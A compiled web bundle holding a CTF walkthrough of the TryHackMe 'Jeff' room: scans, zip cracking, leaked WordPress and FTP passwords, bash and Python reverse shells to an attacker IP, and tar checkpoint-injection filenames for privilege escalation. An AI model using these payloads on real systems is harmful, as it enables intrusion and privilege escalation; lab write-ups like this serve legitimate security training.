"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2987],{3905:(e,t,n)=>{n.d(t,{Zo:()=>l,kt:()=>w});var r=n(67294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function p(e,t){if(null==e)return{};var n,r,s=function(e,t){if(null==e)return{};var n,r,s={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var i=r.createContext({}),c=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},l=function(e){var t=c(e.components);return r.createElement(i.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,s=e.mdxType,a=e.originalType,i=e.parentName,l=p(e,["components","mdxType","originalType","parentName"]),d=c(n),h=s,w=d["".concat(i,".").concat(h)]||d[h]||u[h]||a;return n?r.createElement(w,o(o({ref:t},l),{},{components:n})):r.createElement(w,o({ref:t},l))}));function w(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var a=n.length,o=new Array(a);o[0]=h;var p={};for(var i in t)hasOwnProperty.call(t,i)&&(p[i]=t[i]);p.originalType=e,p[d]="string"==typeof e?e:s,o[1]=p;for(var c=2;c<a;c++)o[c]=n[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},27504:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>o,default:()=>u,frontMatter:()=>a,metadata:()=>p,toc:()=>c});var r=n(87462),s=(n(67294),n(3905));const a={},o="Jeff",p={unversionedId:"Tryhackme/Jeff/Jeff",id:"Tryhackme/Jeff/Jeff",title:"Jeff",description:"Can you hack Jeff's web server?",source:"@site/writeups/Tryhackme/Jeff/Jeff.md",sourceDirName:"Tryhackme/Jeff",slug:"/Tryhackme/Jeff/",permalink:"/writeups/Tryhackme/Jeff/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"JavaScript Basics",permalink:"/writeups/Tryhackme/JavaScript Basics/"},next:{title:"Jupyter 101",permalink:"/writeups/Tryhackme/Jupyter 101/"}},i={},c=[{value:"Task 1 Get Root",id:"task-1-get-root",level:2}],l={toc:c},d="wrapper";function u(e){let{components:t,...n}=e;return(0,s.kt)(d,(0,r.Z)({},l,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"jeff"},"Jeff"),(0,s.kt)("p",null,"Can you hack Jeff's web server?"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("a",{parentName:"li",href:"https://tryhackme.com/room/jeff"},"Jeff"))),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-get-root"},"Task 1 Get Root"),(0,s.kt)("p",null,"This machine may take upto 5 minutes to fully deploy."),(0,s.kt)("p",null,"Get user.txt and root.txt."),(0,s.kt)("p",null,"This is my first ever box, I hope you enjoy it. If you find yourself brute forcing SSH, you're doing it wrong."),(0,s.kt)("p",null,"Please don't post spoilers or stream the box for at least a couple of days."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ sudo nmap -A -sS -sC -sV -Pn -O 10.10.8.137\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 13:12 CEST\nNmap scan report for 10.10.8.137\nHost is up (0.035s latency).\nNot shown: 998 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)\n|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)\n|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)\n80/tcp open  http    nginx\n|_http-title: Site doesn't have a title (text/html).\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Infomir MAG-250 set-top box (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   35.69 ms 10.8.0.1\n2   35.54 ms 10.10.8.137\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.51 seconds\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://jeff.thm\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/17 13:14:30 Starting gobuster\n===============================================================\n/admin (Status: 301)\n/assets (Status: 301)\n/backups (Status: 301)\n/index.html (Status: 200)\n/uploads (Status: 301)\n===============================================================\n2020/10/17 13:14:47 Finished\n===============================================================\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm/admin/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://jeff.thm/admin/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     zip,bak,old,php\n[+] Timeout:        10s\n===============================================================\n2020/10/17 13:14:42 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/login.php (Status: 200)\n===============================================================\n2020/10/17 13:16:07 Finished\n===============================================================\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ gobuster dir -u http://jeff.thm/backups/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://jeff.thm/backups/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     zip,bak,old,php\n[+] Timeout:        10s\n===============================================================\n2020/10/17 13:18:02 Starting gobuster\n===============================================================\n/backup.zip (Status: 200)\n/index.html (Status: 200)\nProgress: 2317 / 4615 (50.21%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/17 13:18:56 Finished\n===============================================================\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ zipinfo backup.zip\nArchive:  backup.zip\nZip file size: 62753 bytes, number of entries: 9\ndrwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/\ndrwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/assets/\n-rwxrwx---  3.0 unx    34858 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.css\n-rwxrwx---  3.0 unx    49963 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.js\n-rwxrwx---  3.0 unx    89614 TX defN 20-May-14 17:20 backup/assets/MooTools-Core-1.6.0-compressed.js\n-rwxrwx---  3.0 unx    11524 BX defN 20-May-14 17:20 backup/assets/profile.jpg\n-rwxrwx---  3.0 unx     1439 TX defN 20-May-14 17:20 backup/assets/style.css\n-rwxrwx---  3.0 unx     1178 TX defN 20-May-14 17:20 backup/index.html\n-rwxrwx---  3.0 unx       41 TX stor 20-May-14 17:20 backup/wpadmin.bak\n9 files, 188617 bytes uncompressed, 60951 bytes compressed:  67.7%\nkali@kali:~/CTFs/tryhackme/Jeff$ zip2john backup.zip > backup.hash\nbackup.zip/backup/ is not encrypted!\nbackup.zip/backup/assets/ is not encrypted!\nver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type\nver 1.0 backup.zip/backup/assets/ is not encrypted, or stored with non-handled compression type\nver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: 2b chk, TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0\nver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: 2b chk, TS_chk, cmplen=14499, decmplen=49963, crc=545D786A\nver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: 2b chk, TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37\nver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A\nver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1\nver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: 2b chk, TS_chk, cmplen=652, decmplen=1178, crc=39D2DBFF\nver 1.0 efh 5455 efh 7875 backup.zip/backup/wpadmin.bak PKZIP Encr: 2b chk, TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB\nNOTE: It is assumed that all files in each archive have the same password.\nIf that is not the case, the hash may be uncrackable. To avoid this, use\noption -o to pick a file at a time.\nkali@kali:~/CTFs/tryhackme/Jeff$ john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n!!Burningbird!!  (backup.zip)\n1g 0:00:00:04 DONE (2020-10-17 13:21) 0.2036g/s 2920Kp/s 2920Kc/s 2920KC/s !!rebound!!..*7\xa1Vamos!\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ cat backup/wpadmin.bak\nwordpress password is: phO#g)C5dhIWZn3BKP\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://jeff.thm\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/dirb/common.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2020/10/17 13:23:32 Starting gobuster\n===============================================================\nFound: wordpress.jeff.thm (Status: 200) [Size: 25901]\n===============================================================\n2020/10/17 13:23:51 Finished\n===============================================================\nkali@kali:~/CTFs/tryhackme/Jeff$ sudo nano /etc/hosts\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jeff$ wpscan --url http://wordpress.jeff.thm -e u\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[i] It seems like you have not updated the database for some time.\n[?] Do you want to update now? [Y]es [N]o, default: [N]Y\n[i] Updating the Database ...\n[i] Update completed.\n\n[+] URL: http://wordpress.jeff.thm/ [10.10.8.137]\n[+] Started: Sat Oct 17 13:25:32 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx\n |  - X-Powered-By: PHP/7.3.17\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://wordpress.jeff.thm/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).\n | Found By: Rss Generator (Passive Detection)\n |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>\n |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>\n\n[+] WordPress theme in use: twentytwenty\n | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/\n | Last Updated: 2020-08-11T00:00:00.000Z\n | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt\n | [!] The version is out of date, the latest version is 1.5\n | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2\n | Style Name: Twenty Twenty\n | Style URI: https://wordpress.org/themes/twentytwenty/\n | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] jeff\n | Found By: Author Posts - Display Name (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Passive Detection)\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Sat Oct 17 13:25:42 2020\n[+] Requests Done: 60\n[+] Cached Requests: 6\n[+] Data Sent: 12.886 KB\n[+] Data Received: 12.99 MB\n[+] Memory used: 177.816 MB\n[+] Elapsed time: 00:00:10\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/9001 0>&1'\");")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@Jeff:/var/www/html$ ls -la\nls -la\ntotal 228\ndrwxr-xr-x  5 www-data www-data  4096 Oct 17 11:12 .\ndrwxr-xr-x  1 root     root      4096 Apr 23 16:34 ..\n-rw-r--r--  1 www-data www-data   261 May 14 16:54 .htaccess\n-rw-r--r--  1 root     root       575 May 18 11:57 ftp_backup.php\n-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php\n-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt\n-rw-r--r--  1 www-data www-data  7278 Jan 10  2020 readme.html\n-rw-r--r--  1 www-data www-data  6912 Feb  6  2020 wp-activate.php\ndrwxr-xr-x  9 www-data www-data  4096 Apr 29 18:58 wp-admin\n-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php\n-rw-r--r--  1 www-data www-data  2275 Feb  6  2020 wp-comments-post.php\n-rw-r--r--  1 www-data www-data  2823 Oct 17 11:12 wp-config-sample.php\n-rw-r--r--  1 www-data www-data  3198 Oct 17 11:12 wp-config.php\ndrwxr-xr-x  4 www-data www-data  4096 Oct 17 11:29 wp-content\n-rw-r--r--  1 www-data www-data  3940 Feb  6  2020 wp-cron.php\ndrwxr-xr-x 21 www-data www-data 12288 Apr 29 18:58 wp-includes\n-rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php\n-rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php\n-rw-r--r--  1 www-data www-data 47874 Feb 10  2020 wp-login.php\n-rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php\n-rw-r--r--  1 www-data www-data 19396 Apr 10  2020 wp-settings.php\n-rw-r--r--  1 www-data www-data 31111 Feb  6  2020 wp-signup.php\n-rw-r--r--  1 www-data www-data  4755 Feb  6  2020 wp-trackback.php\n-rw-r--r--  1 www-data www-data  3133 Feb  6  2020 xmlrpc.php\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@Jeff:/var/www/html$ cat ftp_backup.php\ncat ftp_backup.php\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n/*\n    Todo: I need to finish coding this database backup script.\n          also maybe convert it to a wordpress plugin in the future.\n*/\n$dbFile = \'db_backup/backup.sql\';\n$ftpFile = \'backup.sql\';\n\n$username = "backupmgr";\n$password = "SuperS1ckP4ssw0rd123!";\n\n$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host\n\nif( ! ftp_login($ftp, $username, $password) ){\n    die("FTP Login failed.");\n}\n\n$msg = "Upload failed";\nif (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {\n    $msg = "$file was uploaded.\\n";\n}\n\necho $msg;\nftp_close($conn_id);\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-py"},"#!/usr/bin/env python3.7\nfrom ftplib import FTP\nimport io\n\nhost = '172.20.0.1'\nusername = \"backupmgr\"\npassword = \"SuperS1ckP4ssw0rd123!\"\n\nftp = FTP(host = host)\nlogin_status = ftp.login(user = username,passwd = password)\nprint(login_status)\nftp.set_pasv(False)\nftp.cwd('files')\nprint(ftp.dir())\n\nshell = io.BytesIO(b'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.106.222\",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')\ntrash = io.BytesIO(b'')\n\nftp.storlines('STOR shell.sh',shell)\nftp.storlines('STOR --checkpoint=1',trash)\nftp.storlines('STOR --checkpoint-action=exec=sh shell.sh',trash)\nftp.dir()\n\nftp.quit()\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@Jeff:/tmp$ wget 10.8.106.222/shell.py\nwget 10.8.106.222/shell.py\n--2020-10-17 12:01:19--  http://10.8.106.222/shell.py\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 739 [text/plain]\nSaving to: 'shell.py'\n\n     0K                                                       100% 6.69M=0s\n\n2020-10-17 12:01:19 (6.69 MB/s) - 'shell.py' saved [739/739]\n\nwww-data@Jeff:/tmp$ chmod +x shell.py\nchmod +x shell.py\nwww-data@Jeff:/tmp$ python3.7 shell.py\npython3.7 shell.py\n230 Login successful.\n-rwxr-xr-x    1 1001     1001            0 Oct 17 11:59 --checkpoint-action=exec=sh shell.sh\n-rwxr-xr-x    1 1001     1001            0 Oct 17 11:59 --checkpoint=1\n-rwxr-xr-x    1 1001     1001          228 Oct 17 11:59 shell.sh\nNone\n-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint-action=exec=sh shell.sh\n-rwxr-xr-x    1 1001     1001            0 Oct 17 12:01 --checkpoint=1\n-rwxr-xr-x    1 1001     1001          228 Oct 17 12:01 shell.sh\nwww-data@Jeff:/tmp$\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"curl -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' -s")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'echo "python3.7 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.8.106.222\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/bash\\",\\"-i\\"]);\'" > shell.sh\necho "" > "/tmp/--checkpoint=1"\necho "" > "/tmp/--checkpoint-action=exec=sh shell.sh"\n\nAnd now, let\u2019s upload them to the remote location:\n\ncurl -v -P - -T "/tmp/shell.sh" \'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/\'\ncurl -v -P - -T "/tmp/--checkpoint=1" \'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/\'\ncurl -v -P - -T "/tmp/--checkpoint-action=exec=sh shell.sh" \'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/\'\n')),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Hack the machine and obtain the user.txt flag."),(0,s.kt)("li",{parentName:"ol"},"Escalate your privileges, whats the root flag?")))}u.isMDXComponent=!0}}]);